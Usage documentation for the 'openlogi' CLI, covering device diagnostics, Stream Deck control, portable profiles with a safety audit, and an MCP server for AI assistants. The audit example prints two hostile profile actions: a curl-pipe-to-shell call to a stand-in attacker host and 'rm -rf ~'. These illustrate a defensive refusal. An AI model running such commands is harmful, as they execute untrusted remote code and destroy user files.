# Usage (CLI)

The `openlogi` command-line tool. For install and configuration, see the
[README](../README.md). To check this build against your own peripherals, see
[VERIFYING.md](VERIFYING.md).

```sh
openlogi list                 # paired devices: slot, codename, kind, online, battery
openlogi assets sync          # pre-fetch device renders from the fastest available mirror
openlogi diag features        # dump every HID++ feature the active device reports
openlogi diag controls        # dump reprogrammable controls and capability flags
openlogi diag dpi             # read → write → read-back → restore DPI (smoke test)
openlogi diag smartshift      # toggle SmartShift and restore (smoke test)
openlogi diag lighting ff0000 # solid colour for a wired RGB keyboard (any RRGGBB hex)
openlogi streamdeck           # list attached Elgato Stream Decks
openlogi streamdeck verify    # check the Stream Deck driver against your hardware
openlogi streamdeck fill 0 ff8800   # fill the top-left key with a colour
openlogi streamdeck image 0 icon.png # show a picture on the top-left key
openlogi mcp                  # serve the agent to an AI assistant over MCP (see below)
openlogi profile export FILE  # write this machine's whole configuration to a file
openlogi profile inspect FILE # show what a profile holds, without applying it
openlogi profile import FILE  # apply a profile, backing up the current one first
```

## Stream Decks

`openlogi streamdeck` lists every Stream Deck collection the OS reports;
`brightness`, `reset`, `watch`, `fill`, `image` and `clear` drive an attached
device.

Keys are numbered from 0 at the top left, running left to right then down, and
every command that takes a key also prints its row and column — so "key 7" and
"row 2, column 3" always appear together and you never have to count squares.

`fill` takes six hex digits; `image` takes any common picture file and scales
and rotates it to fit the key, so you do not have to know the model's screen
size or which way its panel is mounted.

**`openlogi streamdeck verify` is worth running first.** The Stream Deck
protocol layer is thoroughly unit-tested but has never met a physical device,
and two things cannot be settled without one: which HID collection carries the
key traffic, and whether the original 2015 Stream Deck reports its keys
mirrored within each row. `verify` exercises both — it prints every collection
found and which one the driver chose, dims and restores the screens, then asks
you to press the top-left key and says whether that key arrived where the
catalogue expects it:

```console
$ openlogi streamdeck verify
...
Saw: key 0 pressed (row 1, column 1)

CORRECT — the top-left key reported as row 1, column 1.
Key ordering for this model is right.
```

A `MISMATCH` line instead means the catalogue is wrong for that model, and the
output is written to be pasted straight into an issue.

If no Stream Deck is found, the command distinguishes "nothing is attached"
from "an Elgato device is attached that this build does not recognize", and
prints the product id a catalogue entry needs in the second case. Those look
identical to a user and have completely different answers.

Running `openlogi` with no subcommand defaults to `list`. Set
`OPENLOGI_LOG=debug` for verbose tracing in the CLI, GUI, or agent.

## Portable profiles

`openlogi profile export` writes the whole configuration to one file you can
carry to another computer — a USB stick, a network share, whatever you already
trust. `openlogi profile import` applies it there, copying the existing
configuration aside first so the change is always reversible. On a machine that
has never run OpenLogi there is nothing to back up, and the import says so.

A configuration is not inert data: it can bind a button to a shell command, an
AppleScript, an application launch, or typed text. Importing a profile someone
sent you is therefore closer to running their script than to loading their
settings. Import audits first and **refuses by default**, listing exactly what
it found and where:

```console
$ openlogi profile import theirs.toml
this profile contains 2 action(s) that would run a program or type text on your
machine. Nothing has been imported. Review them, then re-run accepting them if
you trust the source:
  keyboard.bindings.f13: RunShellCommand — curl http://evil.example/x.sh | sh
  keyboard.bindings.f14: TypeText — rm -rf ~
```

`openlogi profile inspect` shows the same report without applying anything, and
`--accept-actions` on `import` is how you say you trust the source. Key chords
are not flagged: they are the ordinary substance of a profile, and flagging
every one would train you to wave the whole audit through.

Exit status `3` means a profile was refused for this reason, distinct from a
read or parse failure, so a script can tell them apart.

## Model Context Protocol server

`openlogi mcp` serves the running agent to an AI assistant over the Model
Context Protocol, so a device can be inspected and changed by asking for it in
prose rather than through the GUI. It speaks newline-delimited JSON-RPC on
stdin and stdout — the stdio transport MCP clients launch themselves — so it
opens no network port and is reachable only by the process that started it.

It is not a daemon and is not started by hand: an MCP client runs it on demand.
Most clients take a JSON entry naming the command and its arguments,

```json
{
  "mcpServers": {
    "openlogi": {
      "command": "openlogi",
      "args": ["mcp"]
    }
  }
}
```

and clients that register servers through their own CLI instead take the same
`openlogi mcp` command and argument. Use an absolute path to the binary if it is
not on the client's `PATH`, which is often narrower than a login shell's.

The tools exposed are:

| Tool | What it does |
|---|---|
| `list_devices` | Everything attached, with agent health and a route per device |
| `read_dpi` / `set_dpi` | Pointer resolution, and the values the sensor supports |
| `read_smartshift` / `set_smartshift` | Scroll-wheel mode and the speed the ratchet releases at |
| `set_lighting` | Backlight on/off, colour, brightness |
| `set_light` | A standalone light such as a Litra: power, brightness, colour temperature |
| `watch_input` | Watch for a few seconds and report what was pressed |
| `list_cameras` | Every attached webcam, of any brand, with the id the camera tools take |
| `read_camera_controls` | A webcam's controls with current values, accepted ranges, and auto modes |
| `set_camera_control` | Set one webcam control, checked against the range that camera reports |
| `reload_config` | Re-read `config.toml` |
| `export_profile` / `inspect_profile` / `import_profile` | Portable profiles, with the same audit as the CLI |
| `config_location` | Where this machine keeps its configuration file |

The camera tools reach the device directly rather than through the agent, the
same way `openlogi camera` does — UVC controls are a host-exposed class
standard, not agent-owned state, so on macOS the grant that matters is the
CLI's own. Enumeration there is deliberately **not** filtered by vendor: the
same UVC registers answer on an Elgato, an Obsbot or a built-in camera, so
restricting the list to one manufacturer would hide devices that are in fact
controllable.

`import_profile` is deliberately narrower than the CLI: it has no way to accept
a profile that runs programs. Whether a profile's source is trustworthy is a
judgement about provenance that a model cannot make, so it reports what it found
and leaves applying it to a person with `--accept-actions`.

Start from `list_devices`: its output carries, for every device, the route
object the other tools expect back verbatim, so routes are never assembled by
hand. `watch_input` answers the question a device list cannot — *which* button
is the one under your thumb: press it and the agent's hook reports what it saw,
which beats reading indices off a diagram and is the only workable route
without sight.

Everything runs through the same agent IPC the GUI and the rest of this CLI use
— the server holds no device handles of its own — and a tool call made while no
agent is running reports that instead of failing, so the assistant can say what
to start.

Asset synchronization probes `assets.openlogi.org`, the versioned Cloudflare
Pages release alias, and the pinned jsDelivr npm release concurrently. The first
mirror with a valid catalog supplies every file for that synchronization run.
Set `OPENLOGI_ASSETS` or pass `openlogi assets sync --base <URL>` to use one
uniform asset origin instead of automatic mirror selection.
